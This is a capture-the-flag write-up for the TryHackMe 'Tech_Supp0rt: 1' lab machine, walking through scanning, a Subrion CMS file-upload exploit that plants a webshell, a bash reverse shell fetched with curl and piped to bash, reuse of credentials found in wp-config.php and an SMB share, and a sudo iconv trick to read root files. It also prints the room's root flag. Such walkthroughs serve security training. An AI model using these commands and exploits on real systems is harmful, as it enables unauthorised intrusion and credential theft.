## Tech_Supp0rt: 1 - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/techsupp0rt1)

Hack into the machine and investigate the target.

Please allow about 5 minutes for the machine to fully boot!

Note: The theme and security warnings encountered in this room are part of the challenge.

**IP: 10.10.32.50**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Wpscan, enum4linux, Burp Suite, Searchsploit<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Gobuster.

  ```
  nmap -sC -sV 10.10.32.50

  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
  |   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
  |_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
  80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  Host script results:
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: techsupport
  |   NetBIOS computer name: TECHSUPPORT\x00
  |   Domain name: \x00
  |   FQDN: techsupport
  |_  System time: 2025-06-03T01:00:04+05:30
  |_clock-skew: mean: -1h49m56s, deviation: 3h10m30s, median: 1s
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-time: 
  |   date: 2025-06-02T19:30:02
  |_  start_date: N/A
  ```

  ```
  gobuster dir -u http://10.10.32.50/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /index.html           (Status: 200) [Size: 11321]
  /phpinfo.php          (Status: 200) [Size: 94919]
  /server-status        (Status: 403) [Size: 276]
  /test                 (Status: 301) [Size: 309] [--> http://10.10.32.50/test/]
  /wordpress            (Status: 301) [Size: 314] [--> http://10.10.32.50/wordpress/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================

  gobuster dir -u http://10.10.32.50/wordpress/ -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 276]
  /.hta                 (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /index.php            (Status: 200) [Size: 33441]
  /wp-admin             (Status: 301) [Size: 323] [--> http://10.10.32.50/wordpress/wp-admin/]
  /wp-content           (Status: 301) [Size: 325] [--> http://10.10.32.50/wordpress/wp-content/]
  /wp-includes          (Status: 301) [Size: 326] [--> http://10.10.32.50/wordpress/wp-includes/]
  /xmlrpc.php           (Status: 405) [Size: 42]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- Since machine has Samba and Wordpress server, I enumerated them as well.

  ```
  enum4linux -a 10.10.32.50

  ==================================( Share Enumeration on 10.10.32.50 )==================================
  
  
          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          websvr          Disk      
          IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
  Reconnecting with SMB1 for workgroup listing.
  
          Server               Comment
          ---------            -------
  
          Workgroup            Master
          ---------            -------
          WORKGROUP            
  
  [+] Attempting to map shares on 10.10.32.50
  
  //10.10.32.50/print$    Mapping: DENIED Listing: N/A Writing: N/A
  //10.10.32.50/websvr    Mapping: OK Listing: OK Writing: N/A
  
  [E] Can't understand response:
  
  NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
  //10.10.32.50/IPC$      Mapping: N/A Listing: N/A Writing: N/A
  
  smbclient //10.10.32.50/websvr
  Password for [WORKGROUP\username]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Sat May 29 08:17:38 2021
    ..                                  D        0  Sat May 29 08:03:47 2021
    enter.txt                           N      273  Sat May 29 08:17:38 2021
  
                  8460484 blocks of size 1024. 5673196 blocks available
  smb: \> pwd
  Current directory is \\10.10.32.50\websvr\
  smb: \> get enter.txt 
  getting file \enter.txt of size 273 as enter.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
  
  cat enter.txt           
  GOALS
  =====
  1)Make fake popup and host it online on Digital Ocean server
  2)Fix subrion site, /subrion doesn't work, edit from panel
  3)Edit wordpress website
  
  IMP
  ===
  Subrion creds
  |->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
  Wordpress creds
  |->
  ```

  ```
  wpscan --url http://10.10.32.50/wordpress

  Interesting Finding(s):
  
  [+] Headers
   | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
   | Found By: Headers (Passive Detection)
   | Confidence: 100%
  
  [+] XML-RPC seems to be enabled: http://10.10.32.50/wordpress/xmlrpc.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
   | References:
   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
  
  [+] WordPress readme found: http://10.10.32.50/wordpress/readme.html
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
  
  [+] Upload directory has listing enabled: http://10.10.32.50/wordpress/wp-content/uploads/
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 100%
  
  [+] The external WP-Cron seems to be enabled: http://10.10.32.50/wordpress/wp-cron.php
   | Found By: Direct Access (Aggressive Detection)
   | Confidence: 60%
   | References:
   |  - https://www.iplocation.net/defend-wordpress-from-ddos
   |  - https://github.com/wpscanteam/wpscan/issues/1299
  
  [+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
   | Found By: Emoji Settings (Passive Detection)
   |  - http://10.10.32.50/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
   | Confirmed By: Meta Generator (Passive Detection)
   |  - http://10.10.32.50/wordpress/, Match: 'WordPress 5.7.2'
  
  [+] WordPress theme in use: teczilla
   | Location: http://10.10.32.50/wordpress/wp-content/themes/teczilla/
   | Last Updated: 2023-07-29T00:00:00.000Z
   | Readme: http://10.10.32.50/wordpress/wp-content/themes/teczilla/readme.txt
   | [!] The version is out of date, the latest version is 1.1.5
   | Style URL: http://10.10.32.50/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
   | Style Name: Teczilla
   | Style URI: https://www.avadantathemes.com/product/teczilla-free/
   | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
   | Author: avadantathemes
   | Author URI: https://www.avadantathemes.com/
   |
   | Found By: Css Style In Homepage (Passive Detection)
   |
   | Version: 1.0.4 (80% confidence)
   | Found By: Style (Passive Detection)
   |  - http://10.10.32.50/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'
  ```
  
- There's admin credentials in samba share but when I tried to access `/subrion` I got redirected.

  ```
  Request:

  GET /subrion/ HTTP/1.1
  Host: 10.10.32.50
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 302 Found
  Date: Mon, 02 Jun 2025 20:06:58 GMT
  Server: Apache/2.4.18 (Ubuntu)
  Set-Cookie: INTELLI_06c8042c3d=j7oio4b2n172uu6v08vb8dcrod; path=/
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Set-Cookie: INTELLI_06c8042c3d=j7oio4b2n172uu6v08vb8dcrod; expires=Mon, 02-Jun-2025 20:36:58 GMT; Max-Age=1800; path=/
  Location: http://10.0.2.15/subrion/subrion/
  Content-Length: 0
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
  ```

- As always, I checked `robots.txt` and found gold.

  ```
  Request:

  GET /subrion/robots.txt HTTP/1.1
  Host: 10.10.32.50
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Date: Mon, 02 Jun 2025 20:08:30 GMT
  Server: Apache/2.4.18 (Ubuntu)
  Last-Modified: Wed, 13 Jun 2018 23:34:54 GMT
  ETag: "8e-56e8e6e084380-gzip"
  Accept-Ranges: bytes
  Vary: Accept-Encoding
  Content-Length: 142
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/plain
  
  User-agent: *
  Disallow: /backup/
  Disallow: /cron/?
  Disallow: /front/
  Disallow: /install/
  Disallow: /panel/
  Disallow: /tmp/
  Disallow: /updates/
  ```

- When you visit `/subrion/panel` you will see a login page.

---

## ⚙️ Shell Access

- Since we know that app is using `Subrion CMS v4.2.1`, I started looking for exploits. I found this [one](https://www.exploit-db.com/exploits/49876) and you also have it in searchsploit.

  ```
  searchsploit subrion
  ----------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                     |  Path
  ----------------------------------------------------------------------------------- ---------------------------------
  Subrion 3.x - Multiple Vulnerabilities                                             | php/webapps/38525.txt
  Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                            | php/webapps/47469.txt
  Subrion Auto Classifieds - Persistent Cross-Site Scripting                         | php/webapps/14391.txt
  SUBRION CMS - Multiple Vulnerabilities                                             | php/webapps/17390.txt
  Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                         | php/webapps/21267.txt
  subrion CMS 2.2.1 - Multiple Vulnerabilities                                       | php/webapps/22159.txt
  Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                         | php/webapps/47851.txt
  Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scri | php/webapps/40553.txt
  Subrion CMS 4.0.5 - SQL Injection                                                  | php/webapps/40202.txt
  Subrion CMS 4.2.1 - 'avatar[path]' XSS                                             | php/webapps/49346.txt
  Subrion CMS 4.2.1 - Arbitrary File Upload                                          | php/webapps/49876.py
  Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                   | php/webapps/50737.txt
  Subrion CMS 4.2.1 - Cross-Site Scripting                                           | php/webapps/45150.txt
  Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                              | php/webapps/51110.txt
  ----------------------------------------------------------------------------------- ---------------------------------
  Shellcodes: No Results
  ```
  
- Now simply run the exploit and you will get the shell.

  ```
  python3 49876.py -u http://10.10.32.50/subrion/panel/ --user admin --passw Scam2021
  [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
  
  [+] Trying to connect to: http://10.10.32.50/subrion/panel/
  [+] Success!
  [+] Got CSRF token: 9lH9wEwNeYxK7kdfcdy3lKzm15VhD86lB1Wb9bnY
  [+] Trying to log in...
  [+] Login Successful!
  
  [+] Generating random name for Webshell...
  [+] Generated webshell name: rzjahuztuwcvmng
  
  [+] Trying to Upload Webshell..
  [+] Upload Success... Webshell path: http://10.10.32.50/subrion/panel/uploads/rzjahuztuwcvmng.phar 
  
  $ whoami
  www-data
  
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- The thing with this shell is that we can't do anything with it at the moment so I switched to more stable shell. Create a classic bash reverse shell on your local machine, run the Python server and use `curl` to get the shell to target machine and run it.

  ```
  cat shell.sh
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  
  python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.32.50 - - [02/Jun/2025 21:29:59] "GET /shell.sh HTTP/1.1" 200 -
  
  curl http://[YOUR-THM-IP]:80/shell.sh | bash
  
  nc -lvnp 4444              
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.32.50] 51328
  bash: cannot set terminal process group (1406): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@TechSupport:/var/www/html/subrion/uploads$ whoami
  whoami
  www-data
  www-data@TechSupport:/var/www/html/subrion/uploads$ id
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

---

## 🧍 User Privilege Escalation

- In order to read the flag we need to escalate to user `scamsite` then root. You can find `scamsite` credentials in `wp-config.php`.

  ```
  www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php 
  <?php
  /**
   * The base configuration for WordPress
   *
   * The wp-config.php creation script uses this file during the
   * installation. You don't have to use the web site, you can
   * copy this file to "wp-config.php" and fill in the values.
   *
   * This file contains the following configurations:
   *
   * * MySQL settings
   * * Secret keys
   * * Database table prefix
   * * ABSPATH
   *
   * @link https://wordpress.org/support/article/editing-wp-config-php/
   *
   * @package WordPress
   */
  
  // ** MySQL settings - You can get this info from your web host ** //
  /** The name of the database for WordPress */
  define( 'DB_NAME', 'wpdb' );
  
  /** MySQL database username */
  define( 'DB_USER', 'support' );
  
  /** MySQL database password */
  define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
  
  /** MySQL hostname */
  define( 'DB_HOST', 'localhost' );
  
  /** Database Charset to use in creating database tables. */
  define( 'DB_CHARSET', 'utf8' );
  
  /** The Database Collate type. Don't change this if in doubt. */
  define( 'DB_COLLATE', '' );
  [SNIP!]
  ```
  
- As always I try newly found passwords on all available services and well got in as `scamsite`.

  ```
  www-data@TechSupport:/var/www/html/wordpress$ su scamsite 
  Password: 
  scamsite@TechSupport:/var/www/html/wordpress$ whoami
  scamsite
  scamsite@TechSupport:/var/www/html/wordpress$ id
  uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
  ```
  
- Now I switched to SSH and continued to root.

---

## 👑 Root Privilege Escalation

- Root flag is pretty simple, `sudo -l` and GTFOBins will carry this.

  ```
  scamsite@TechSupport:~$ sudo -l
  Matching Defaults entries for scamsite on TechSupport:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User scamsite may run the following commands on TechSupport:
      (ALL) NOPASSWD: /usr/bin/iconv
  ```
  
- On GTFOBins, you can find the one-liner exploit for `iconv`. We will use it to read the flag.

  ```
  scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "/root/root.txt" 
  851b8233a8c09400ec30651bd1529bf1ed02790b  -
  ```

---

## 🏁 Flags

- **Root Flag**: `851b8233a8c09400ec30651bd1529bf1ed02790b`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way around the room.`

- What did I learn?
  `Few new exploitation techniques.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
